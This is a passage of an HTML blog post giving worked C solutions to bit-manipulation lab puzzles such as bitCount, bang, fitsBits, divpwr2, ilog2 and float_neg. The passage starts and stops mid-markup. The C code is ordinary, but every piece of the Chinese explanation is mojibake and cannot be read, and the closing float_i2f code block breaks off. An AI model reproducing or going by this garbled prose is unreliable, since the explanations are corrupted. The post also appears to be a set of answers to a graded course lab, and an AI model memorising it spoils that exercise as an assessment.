ä¸ºä¸èƒ½ä½¿ç”¨å‡å·ï¼Œæ‰€ä»¥å°†1å·¦ç§»31ä½åé‡‡ç”¨å…ˆå³ç§»n,å†å·¦ç§»1ä½çš„æ–¹æ³•ï¼Œæœ€åå–åã€‚</p><p>ä¸ç®—æœ¯å³ç§»è¿›è¡Œä¸å³å¯å¾—åˆ°ç»“æœ</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalShift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> result = (x &gt;&gt; n) &amp; (~(((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &gt;&gt; n) &lt;&lt; <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="4bitcount"><a class="markdownIt-Anchor" href="#4bitcount"></a> 4.bitCount</h2><p>æ­¤é—®é¢˜è¾ƒä¸ºå¤æ‚ï¼Œå‚è€ƒäº†ç½‘ä¸Šçš„åšæ³•ï¼Œé‡‡ç”¨è‡ªåº•å‘ä¸Šçš„æ–¹å¼è¿›è¡Œæ±‚è§£ï¼Œå…ˆæ±‚ä¸¤ä½ä¸­1çš„ä¸ªæ•°ã€å†æ±‚å››ä½ä¸­1çš„ä¸ªæ•°â€¦â€¦æœ€åæ±‚ä¸‰åäºŒä½ä¸­1çš„ä¸ªæ•°</p><p>å…·ä½“è¿‡ç¨‹å¦‚å›¾æ‰€ç¤º:</p><p><img src="/posts/330a79db/image-20210406160622289.png" alt></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> mask_1,mask_2,mask_4,mask_8,mask_16;<br><br>  mask_1=<span class="hljs-number">0x55</span>|(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_1=mask_1|(mask_1&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//è®¡ç®—å¾—åˆ°0x55555555,å³01010101Â·Â·Â·</span><br>  mask_2=<span class="hljs-number">0x33</span>|(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_2=mask_2|(mask_2&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//è®¡ç®—å¾—åˆ°0x33333333,å³00110011Â·Â·Â·</span><br>  mask_4=<span class="hljs-number">0x0f</span>|(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_4=mask_4|(mask_4&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//è®¡ç®—å¾—åˆ°0x0f0f0f0f,å³00001111Â·Â·Â·</span><br>  mask_8=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//0000000011111111 0000000011111111</span><br>  mask_16=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<span class="hljs-comment">//00000000000000001111111111111111</span><br>  x=(x&amp;mask_1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask_1);<br>  x=(x&amp;mask_2)+((x&gt;&gt;<span class="hljs-number">2</span>)&amp;mask_2);<br>  <span class="hljs-comment">//ä¸‹é¢ä¸‰ç»„æœ€é«˜ä½ä¸ä¼šæ˜¯1äº† </span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">4</span>))&amp;mask_4;<span class="hljs-comment">//x=(x&amp;mask_4)+((x&gt;&gt;4)&amp;mask_4);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">8</span>))&amp;mask_8;<span class="hljs-comment">//x=(x&amp;mask_8)+((x&gt;&gt;8)&amp;mask_8);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">16</span>))&amp;mask_16;<span class="hljs-comment">//x=(x&amp;mask_16)+((x&gt;&gt;16)&amp;mask_16);</span><br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="5bang"><a class="markdownIt-Anchor" href="#5bang"></a> 5.bang</h2><p>ä¸åˆ©ç”¨é€»è¾‘ç¬¦å·!æ±‚ä¸€ä¸ªæ•°çš„é€»è¾‘éï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­è¯¥æ•°çš„äºŒè¿›åˆ¶ä½<strong>æ˜¯å¦å…¨ä¸º0</strong>ï¼Œè‹¥å…¨ä¸º0åˆ™è¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</p><p>ä¸€ä¸ª<strong>æ±‚è¡¥ç </strong>çš„æ–¹æ³•ï¼š<strong>ä»æœ€ä½ä½åˆ°ç¬¬ä¸€ä¸ª1ä¹‹é—´ä¸å˜ï¼Œå…¶ä»–ä½æŒ‰ä½å–å</strong>ã€‚</p><p>ä¸€ä¸ªæ•°ä¸å…¶è¡¥ç ç›¸æˆ–åï¼Œåªæœ‰0x00000000çš„ç»“æœæœ€é«˜ä½æ˜¯0ï¼Œå…¶ä»–æ•°ç»“æœéƒ½æ˜¯1ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†åŸæ•°ä¸å…¶è¡¥ç ç›¸æˆ–åå³ç§»31ä½å¾—åˆ°æœ€é«˜ä½ï¼Œå°†æœ€é«˜ä½ä¸1ç›¸ä¸ï¼Œç»“æœä¸º0è¯´æ˜åŸæ•°æ˜¯0ï¼Œå–ååè¾“å‡º1ï¼Œå¦åˆ™è¯´æ˜åŸæ•°ä¸ä¸º0ï¼Œå–ååè¾“å‡º0ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> ~((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6tmin"><a class="markdownIt-Anchor" href="#6tmin"></a> 6.tmin</h2><p>è¿”å› æœ€å°çš„äºŒè¿›åˆ¶è¡¥ç ï¼Œä¸º0x 8000 0000ï¼Œç›´æ¥å·¦ç§»31ä½å³å¯</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="7fitsbits"><a class="markdownIt-Anchor" href="#7fitsbits"></a> 7.fitsBits</h2><p>åˆ¤æ–­ä¸€ä¸ªæ•°èƒ½å¦è¡¨ç¤ºæˆnä½çš„äºŒè¿›åˆ¶ï¼Œèƒ½åˆ™è¿”å›1ï¼Œä¸èƒ½è¿”å›0</p><p>å…³é”®åœ¨äºè¿™ä¸ªnä½æ˜¯åŒ…æ‹¬ç¬¦å·ä½çš„ï¼Œå³å¯¹äºä¸€ä¸ªæ•´æ•°ï¼Œå…¶æœ€é«˜ä½åº”ä¸º0ï¼Œå¯¹äºä¸€ä¸ªè´Ÿæ•°ï¼Œæœ€é«˜ä½ä¸º1</p><p>å…ˆå·¦ç§»32-n å†å³ç§»32-n,è€ƒè™‘ç¬¦å·ä½ï¼Œè‹¥ä¸xç›¸ç­‰åˆ™è¯´æ˜å¯ä»¥ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> * n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> * 1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> * Max ops: 15</span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fitsBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> shiftNumber= <span class="hljs-number">32</span> + (~n + <span class="hljs-number">1</span>);<span class="hljs-comment">// 32 - n</span><br>   <span class="hljs-keyword">return</span> !(x^((x&lt;&lt;shiftNumber)&gt;&gt;shiftNumber));<br>   &#125;<br></code></pre></div></td></tr></table></figure><h2 id="8divpwr2"><a class="markdownIt-Anchor" href="#8divpwr2"></a> 8.divpwr2</h2><p>å°†ä¸€ä¸ªæ•°é™¤ä»¥2çš„næ¬¡æ–¹</p><p>é™¤æ³•æ˜¯å‘ä¸‹å–æ•´ï¼Œæ­£æ•°ä½è¿ç®—å’Œé™¤æ³•è¿ç®—ç›¸åŒï¼Œè´Ÿæ•°é™¤æ³•å‘0å–æ•´ï¼Œä½è¿ç®—å‘ä¸‹å–æ•´ï¼Œ<br>æ‰€ä»¥è¦é ä½è¿ç®—æ¥å®ç°è´Ÿæ•°é™¤æ³•å°±è¦åŠ ä¸€ä¸ªåç½®é‡ï¼Œä½¿å…¶å˜æˆæ¯”åŸæ¥çš„æ•°å°2^nä¸ªå•ä½çš„æ•°<br>ä½¿å¾—æ–°æ•°é€šè¿‡ä½è¿ç®—çš„å‘ä¸‹å–æ•´å’ŒåŸæ•°çš„å‘0å–æ•´ç»“æœç›¸åŒ</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divpwr2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx=x&gt;&gt;<span class="hljs-number">31</span>;<br><span class="hljs-keyword">int</span> mask =(<span class="hljs-number">1</span>&lt;&lt;n)+(~<span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> bias=signx&amp;mask;<br>    <span class="hljs-keyword">return</span> (bias+x)&gt;&gt;n;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="9negate"><a class="markdownIt-Anchor" href="#9negate"></a> 9.negate</h2><p>è¿”å›-xï¼Œå¾ˆç®€å•</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="10ispositive"><a class="markdownIt-Anchor" href="#10ispositive"></a> 10.isPositive</h2><p>æ­£æ•°ç¬¦å·ä½ä¸º0ï¼Œè´Ÿæ•°ç¬¦å·ä½ä¸ºï¼Œ0çš„ç¬¦å·ä½ä¹Ÿæ˜¯0ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(x&gt;&gt;<span class="hljs-number">31</span>|!x);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="11islessorequal"><a class="markdownIt-Anchor" href="#11islessorequal"></a> 11.isLessOrEqual</h2><p>è¿™é“é¢˜ç›¸å½“äºæšä¸¾ x&lt;=y çš„æ‰€æœ‰æƒ…å†µï¼š<br>1.xä¸ºè´Ÿæ•°ï¼Œy ä¸ºæ­£æ•°<br>2.x ç­‰äº y<br>3.x å’Œ y ç¬¦å·ç›¸åŒï¼Œå¹¶ä¸” y-x ä¸ºæ­£æ•°</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> signy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> tmp = signx ^ signy;<br><span class="hljs-keyword">int</span> tmp1 = tmp &amp; signx;<span class="hljs-comment">//ä¸º1æ—¶è¡¨ç¤ºxä¸ºè´Ÿæ•°ï¼Œyä¸ºæ­£æ•°</span><br><span class="hljs-keyword">int</span> y_x=y+(~x+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> tmp1|(!(x^y))|(!tmp&amp;!(y_x&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="12ilog2"><a class="markdownIt-Anchor" href="#12ilog2"></a> 12.ilog2</h2><p>æ±‚ä¸€ä¸ªæ•°æ˜¯2çš„å‡ æ¬¡å¹‚ï¼Œå³æ±‚æœ€é«˜ä½çš„1çš„ç´¢å¼•ï¼ˆ0-31ï¼‰</p><p>ä¹Ÿæ˜¯äºŒåˆ†ï¼Œå…ˆå»æ‰å16ä½ï¼Œå…ˆåˆ¤æ–­å·¦è¾¹16ä½ï¼Œè‹¥å…¨æ˜¯0ï¼Œåˆ™!!(x&gt;&gt;16)è¿”å›0ï¼Œå¦åˆ™è¿”å›1,1&lt;&lt;4åˆ™è®°å½•å·¦è¾¹16ä½çš„æœ€ä½ä½ç´¢å¼•</p><p>è‹¥å‰16ä½ä¸­å«1ï¼Œåˆ™åªä¿ç•™äº†å‰16ä½ï¼Œå¦åˆ™å‰16çš„0å¯ä»¥å¿½ç•¥ï¼Œç›¸å½“äºè€ƒè™‘å16ä½</p><p>ä¹‹ååŒç†ï¼Œå°†16ä½äºŒåˆ†ï¼Œç„¶åè®°å½•ç´¢å¼•ã€‚</p><p>å…¨éƒ¨ç´¢å¼•ç›¸åŠ å°±æ˜¯ç»“æœ</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ilog2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> bitsNumber = <span class="hljs-number">0</span>;<br>bitsNumber = (!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//å»æ‰å16ä½ï¼Œåˆ¤æ–­å·¦è¾¹16ä½æ˜¯å¦å…¨ä¸º0ï¼Œä¸æ˜¯åˆ™è®°å½•å·¦è¾¹16ä½çš„æœ€ä½ä½ç´¢å¼•</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">8</span>)) &lt;&lt; <span class="hljs-number">3</span>);<span class="hljs-comment">//åˆ¤æ–­å·¦è¾¹16ä½æ˜¯å¦å…¨ä¸º0ï¼Œä¸æ˜¯åˆ™è®°å½•å·¦è¾¹ä½8çš„æœ€ä½ä½ç´¢å¼•</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">2</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">2</span>)) &lt;&lt; <span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">1</span>)));<span class="hljs-comment">//</span><br><span class="hljs-keyword">return</span> bitsNumber;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="13float_neg"><a class="markdownIt-Anchor" href="#13float_neg"></a> 13.float_neg</h2><p>è¿”å›ä¸€ä¸ªæ— ç¬¦å·æµ®ç‚¹æ•°çš„è´Ÿçš„å•ç²¾åº¦æµ®ç‚¹æ•°è¡¨è¾¾ï¼Œå‚æ•°NaNï¼ˆé˜¶ç å…¨ä¸º1ï¼Œå°æ•°åŸŸé0ï¼‰æ—¶è¿”å›åŸå€¼</p><p>å…³é”®åœ¨äºNaNçš„åˆ¤æ–­ï¼Œå…¶ä»–å‚æ•°åŠ ä¸Šä¸€ä¸ªç¬¦å·ä½å³å¯ï¼›</p><p>((uf&gt;&gt;23)&amp;0xff)^0xffåˆ¤æ–­é˜¶ç æ˜¯å¦å…¨ä¸º1ï¼Œæ˜¯çš„è¯ç»“æœä¸º0ï¼Œ!(uf&amp;((1&lt;&lt;23)-1))åˆ¤æ–­å°æ•°åŸŸæ˜¯å¦å…¨ä¸º0ï¼Œæ˜¯çš„è¯ä¸º1</p><p>æ‰€ä»¥ä»£ç å«ä¹‰å°±æ˜¯ï¼š</p><p>if(ä¸æ˜¯NaN)åŠ ç¬¦å·ä½</p><p>å¦åˆ™è¿”å›åŸå‚æ•°</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_neg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((((uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0xff</span>)||!(uf&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>)<span class="hljs-number">-1</span>))) uf=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^uf;<br><br>  <span class="hljs-keyword">return</span> uf;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="14float_i2f"><a class="markdownIt-Anchor" href="#14float_i2f"></a> 14.float_i2f</h2><p>å°†ä¸€ä¸ªintå‹æ•°è½¬åŒ–ä¸ºæµ®ç‚¹å‹ã€‚</p><p>é—®é¢˜é‡ç‚¹åœ¨äºè€ƒè™‘æµ®ç‚¹æ•°çš„èˆå…¥</p><ul><li><p>æµ®ç‚¹æ•°èˆå…¥è§„åˆ™</p><p>å¦‚æœä»¥å½¢å¼1.RRâ€¦RDDâ€¦Dè¡¨ç¤ºæµ®ç‚¹æ•°ï¼ˆRè¡¨ç¤ºæœ‰æ•ˆä½ï¼Œæˆ–ä¿ç•™ä½ï¼Œè€ŒDè¡¨ç¤ºèˆå»ä½ï¼‰ï¼Œèˆå…¥è§„åˆ™å°±æ˜¯ï¼š</p><p>å¦‚æœDDâ€¦D &lt; 10â€¦0ï¼Œåˆ™å‘ä¸‹èˆå…¥</p><p>å¦‚æœDDâ€¦D &gt; 10â€¦0ï¼Œåˆ™å‘ä¸Šèˆå…¥</p><p>å¦‚è¦DDâ€¦D = 10â€¦0ï¼Œåˆ™å‘æœ€è¿‘å¶æ•°èˆå…¥ï¼Œç»†åˆ™å¦‚ä¸‹ ï¼š</p><p>a. å¦‚æœRRâ€¦R = XXâ€¦0 ï¼ˆæœ€ä½æœ‰æ•ˆä½æ˜¯0ï¼‰ï¼Œåˆ™å‘ä¸‹èˆå…¥</p><p>b. å¦‚æœRRâ€¦R = XXâ€¦1ï¼ˆæœ€ä½æœ‰æ•ˆä½æ˜¯1ï¼‰ï¼Œåˆ™å‘ä¸Šèˆå…¥</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 